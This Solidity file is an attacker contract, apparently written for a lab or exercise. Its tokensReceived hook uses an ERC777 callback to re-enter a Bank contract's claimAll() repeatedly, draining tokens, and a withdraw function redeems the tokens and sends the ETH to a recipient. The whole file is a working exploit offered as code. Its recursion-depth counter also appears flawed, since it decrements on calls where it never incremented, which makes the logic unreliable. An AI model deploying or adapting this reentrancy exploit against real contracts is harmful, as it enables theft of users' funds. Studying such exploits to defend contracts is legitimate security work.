// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "./Bank.sol";

contract Attacker is AccessControl, IERC777Recipient {
    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
    IERC1820Registry private constant _erc1820 = IERC1820Registry(
        0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
    ); // EIP1820 registry address
    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    Bank public bank;
    uint256 public attackAmount;
    uint8 private depth = 0;
    uint8 private constant MAX_DEPTH = 10; // Adjusted recursion depth

    event Recurse(uint8 depth);

    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(ATTACKER_ROLE, admin);

        // Register this contract as an ERC777TokensRecipient
        _erc1820.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    /*
       Sets the target Bank contract to attack
    */
    function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
        bank = Bank(bank_address);
    }

    /*
       Starts the reentrancy attack
       amt: The amount of ETH to deposit initially
    */
    function attack(uint256 amt) external payable onlyRole(ATTACKER_ROLE) {
        require(address(bank) != address(0), "Target bank not set");
        require(msg.value == amt, "Incorrect ETH amount sent");

        attackAmount = amt;

        // Deposit ETH to have a positive balance in the Bank
        bank.deposit{value: amt}();

        // Start the reentrancy attack by calling claimAll()
        bank.claimAll();
    }

    /*
       Withdraws stolen tokens to the recipient
    */
    function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
        require(recipient != address(0), "Invalid recipient");

        // Redeem tokens for ETH
        ERC777 token = bank.token();
        uint256 tokenBalance = token.balanceOf(address(this));

        require(tokenBalance > 0, "No tokens to redeem");

        // Approve the Bank contract to spend tokens
        token.approve(address(bank), tokenBalance);

        // Redeem tokens for ETH
        bank.redeem(tokenBalance);

        // Transfer ETH to recipient
        (bool success, ) = recipient.call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    /*
       Called when tokens are received from the Bank contract
    */
    function tokensReceived(
        address, /* operator */
        address, /* from */
        address, /* to */
        uint256, /* amount */
        bytes calldata, /* userData */
        bytes calldata /* operatorData */
    ) external override {
        // Ensure the function is called by the Bank's token contract
        require(msg.sender == address(bank.token()), "Invalid token sender");

        if (depth < MAX_DEPTH) {
            depth++;

            // Reentrantly call claimAll() to exploit the vulnerability
            bank.claimAll();

            emit Recurse(depth);
        }

        depth--;
    }

    // Allow contract to receive ETH
    receive() external payable {}
}
